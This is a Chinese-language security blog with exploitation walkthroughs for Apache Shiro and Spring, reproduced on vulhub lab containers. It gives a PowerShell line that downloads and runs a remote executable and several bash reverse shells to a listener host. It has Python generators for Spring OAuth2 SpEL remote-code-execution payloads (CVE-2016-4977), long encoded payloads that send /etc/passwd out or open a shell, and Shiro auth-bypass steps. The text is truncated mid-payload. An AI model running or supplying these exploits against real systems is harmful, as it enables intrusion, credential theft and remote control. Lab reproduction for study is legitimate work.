系统</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856122.png" alt="image-20210515072513728"></p><h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>熟练的操作一遍</p><p>生成马儿</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856123.png" alt="image-20210515073534804"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856124.png" alt="image-20210515073556410"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856125.png" alt="image-20210515073621654"></p><p>python开启服务</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856126.png" alt="image-20210515073808383"></p><p>拿到的shell执行powershell一句话</p><pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.175.130:8888/a001.exe','a001.exe');start-process a001.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856127.png" alt="image-20210515073851831"></p><p>成功上线</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856128.png" alt="image-20210515073929807"></p><p>可以看到权限事System权限</p><h3 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h3><h4 id="拿到shell-1"><a href="#拿到shell-1" class="headerlink" title="拿到shell"></a>拿到shell</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856129.png" alt="image-20210515072628016"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856130.png" alt="image-20210515072605647"></p><h4 id="上线vps"><a href="#上线vps" class="headerlink" title="上线vps"></a>上线vps</h4><pre class="line-numbers language-none"><code class="language-none">nc -lvp 8888bash -i &gt;&amp; /dev/tcp/IP/8888 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="内网环境打Shrio"><a href="#内网环境打Shrio" class="headerlink" title="内网环境打Shrio"></a>内网环境打Shrio</h2><h2 id="自动化武器"><a href="#自动化武器" class="headerlink" title="自动化武器"></a>自动化武器</h2><h3 id="Shiro反序列化漏洞综合利用工具"><a href="#Shiro反序列化漏洞综合利用工具" class="headerlink" title="Shiro反序列化漏洞综合利用工具"></a>Shiro反序列化漏洞综合利用工具</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856131.png" alt="image-20210515155916974"></p><h3 id="自动加key回显工具"><a href="#自动加key回显工具" class="headerlink" title="自动加key回显工具"></a>自动加key回显工具</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856132.png" alt="image-20210515160136173"></p><p>把key复制过去</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856133.png" alt="image-20210515160124862"></p><h3 id="命令执行工具-117个key"><a href="#命令执行工具-117个key" class="headerlink" title="命令执行工具-117个key"></a>命令执行工具-117个key</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856134.png" alt="image-20210515160406859"></p><h3 id="Shiro550-720漏洞检测工具–Linux好用"><a href="#Shiro550-720漏洞检测工具–Linux好用" class="headerlink" title="Shiro550_720漏洞检测工具–Linux好用"></a>Shiro550_720漏洞检测工具–Linux好用</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856135.png" alt="image-20210515160609251"></p><p>一般是选择这两个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856136.png" alt="image-20210515160645604"></p><h2 id="Apache-shrio权限绕过-CVE-2020-11989"><a href="#Apache-shrio权限绕过-CVE-2020-11989" class="headerlink" title="Apache shrio权限绕过(CVE-2020-11989)"></a>Apache shrio权限绕过(CVE-2020-11989)</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。<br>Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon，authc等拦截器。</p><p>anon为匿名拦截器，不需要登录即可访问；</p><p>authc为登录拦截器，需要登录才可以访问。</p><p>Shiro的URL路径表达式为Ant格式，路径通配符表示匹配零个或多个字符串，<code>/</code>可以匹配<code>/hello</code>，但是匹配不到<code>/hello/</code>，因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>会进行权限判断，但如果访问的是<code>/hello/</code>，那么将无法正确匹配URL，直接放行，进入到spring拦截器。spring中的<code>/hello</code>和<code>/hello/</code>形式的URL访问的资源是一样的，从而实现了权限绕过。</p><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;1.5.2版本</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre class="line-numbers language-none"><code class="language-none">docker pull vulfocus/shiro-cve_2020_1957 #拉取镜像docker images                            #查看开启的IDdocker run -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.175.130 29136b1d3c61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856137.png" alt="image-20210515162145988"></p><p>这里是Kali本机的IP</p><p>成功访问</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856138.png" alt="image-20210515162348920"></p><p>进行抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856139.png" alt="image-20210515162546262"></p><p>访问<code>/hello/1</code> 接口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856140.png" alt="image-20210515162636567"></p><p>发生了302跳转</p><p>那么在加一个<code>/</code></p><p>成功绕过</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856141.png" alt="image-20210515162718265"></p><h3 id="漏洞比较"><a href="#漏洞比较" class="headerlink" title="漏洞比较"></a>漏洞比较</h3><p>CVE-2020-13933虽然是CVE-2020-11989的绕过，然而两者的绕过内容却不同！</p><p>CVE-2020-11989：针对于<code>/admin/page</code>，这种固定路由，shiro得到的地址为<code>/</code>，因此认为可以访问，Spring得到的地址为<code>/admin/page</code>，从而定位到未授权的页面！</p><p>CVE-2020-13933则是匹配非固定地址路由，比如<code>/admin/{name}</code>，因为shiro得到的是<code>/admin/</code>，认为可以访问，而Spring得到的是<code>/admin/;page</code>，如果也采取固定路由，则会因为找不到<code>;page</code>，从而返回404！</p><h2 id="Apache-Shiro-认证绕过漏洞-CVE-2020-1957"><a href="#Apache-Shiro-认证绕过漏洞-CVE-2020-1957" class="headerlink" title="Apache Shiro 认证绕过漏洞(CVE-2020-1957)"></a>Apache Shiro 认证绕过漏洞(CVE-2020-1957)</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro&lt;1.5.3</p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring小结</title>
      <link href="/2021/10/28/spring/"/>
      <url>/2021/10/28/spring/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring是 Java EE编程领域的一个轻量级开源框架，该框架是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。</p><p>框架的主要<strong>优势</strong>之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为J2EE应用程序开发提供集成的框架</p><h2 id="简单组件介绍"><a href="#简单组件介绍" class="headerlink" title="简单组件介绍"></a>简单组件介绍</h2><p>Spring发展至今，整个体系不断壮大，这里只简单介绍一些组件。<br>首先是 Spring Websocket，Spring内置简单消息代理。这个代理处理来自客户端的订阅请求，将它们存储在内存中，并将消息广播到具有匹配目标的连接客户端。</p><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。</p><p>Spring Data Commons是 Spring Data下所有子项目共享的基础框架，Spring Data家族中的所有实现都是基于 Spring Data Commons。</p><p><strong>简单点说，Spring Data REST把我们需要编写的大量REST模版接口做了自动化实现，并符合HAL的规范</strong></p><p>Spring Web Flow是Spring MVC的扩展，它支持开发基于流程的应用程序，可以将流程的定乂和实现流程行为的类和视图分离开来</p><h2 id="Spring渗透"><a href="#Spring渗透" class="headerlink" title="Spring渗透"></a>Spring渗透</h2><h3 id="Spring-Security-OAuth2远程命令执行突破-CVE-2016-4977"><a href="#Spring-Security-OAuth2远程命令执行突破-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2远程命令执行突破(CVE-2016-4977)"></a>Spring Security OAuth2远程命令执行突破(CVE-2016-4977)</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><pre class="line-numbers language-none"><code class="language-none">2.0.0-2.0.91.0.0-1.0.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>还是使用P牛的靶场</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/spring/CVE-2016-4977sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521080906589.png" alt="image-20210521080906589"></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521081105117.png" alt="image-20210521081105117"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问该url 会进行登录验证</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521081127941.png" alt="image-20210521081127941"></p><p>默认账号密码是</p><pre class="line-numbers language-none"><code class="language-none">adminadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录成功</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521081210298.png" alt="image-20210521081210298"></p><h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p>我们看一下vulhub提供的Poc</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是java的命令执行</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521082836766.png" alt="image-20210521082836766"></p><p>执行一下poc.py</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108172059966.png" alt="image-20210521082811068"></p><h4 id="测试RCE"><a href="#测试RCE" class="headerlink" title="测试RCE"></a>测试RCE</h4><p>我们执行的命令是<code>whoami</code> 把回显放到表达式中</p><p>执行一下</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521083111824.png" alt="image-20210521083111824"></p><p>这里注意：只是返回了进程，但实际上是命令执行</p><p>这是<strong>无回显RCE</strong></p><h4 id="测试XXE"><a href="#测试XXE" class="headerlink" title="测试XXE"></a>测试XXE</h4><p>先在bash下做测试</p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.175.130:8888 -d "$(cat /etc/passwd)" nc -lvp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521084442961.png" alt="image-20210521084442961"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521084453479.png" alt="image-20210521084453479"></p><p>那么就将该命令放入poc中生成最终的payload</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521084757291.png" alt="image-20210521084757291"></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(36)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(32)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\image-20210521084905830.png" alt="image-20210521084905830"></p><p>执行成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108172100502.png"></p><p>但是这边nc反弹之后 后面没有东西了</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085003681.png" alt="image-20210521085003681"></p><h4 id="踩坑记录："><a href="#踩坑记录：" class="headerlink" title="踩坑记录："></a>踩坑记录：</h4><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085950628.png" alt="image-20210521085950628"></p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.175.130:8888 -d "$(cat /etc/passwd)" bash -c {echo,Y3VybCAxOTIuMTY4LjE3NS4xMzA6ODg4OCAtZCAiJChjYXQgL2V0Yy9wYXNzd2QpIiA=}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090037876.png" alt="image-20210521090037876"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090154377.png" alt="image-20210521090154377"></p><p>最终的payload</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(57)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(88)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行之后 成功回显</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090244473.png" alt="image-20210521090244473"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090223786.png" alt="image-20210521090223786"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>那么这边我直接反弹shell了</p><p>上java编码的网站</p><pre class="line-numbers language-none"><code class="language-none">http://www.jackson-t.ca/runtime-exec-payloads.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085321594.png" alt="image-20210521085321594"></p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.130/8888 0&gt;&amp;1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将该命令放入Poc中</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085526917.png" alt="image-20210521085526917"></p><p>最终的payload：</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行一下</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085717667.png" alt="image-20210521085717667"></p><p>成功拿到shell</p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521085734350.png" alt="image-20210521085734350"></p><h4 id="优化Poc"><a href="#优化Poc" class="headerlink" title="优化Poc"></a>优化Poc</h4><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonimport base64message = input('Enter message to encode:')message = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % bytes.decode(base64.b64encode(message.encode('utf-8')))print(message)poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090415010.png" alt="image-20210521090415010"></p><p><img src="C:/Users/12550/AppData/Roaming/Typora/typora-user-images/image-20210521090655856.png" alt="image-20210521090655856"></p><p>最终的payload</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.209:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(105)).concat(T(java.lan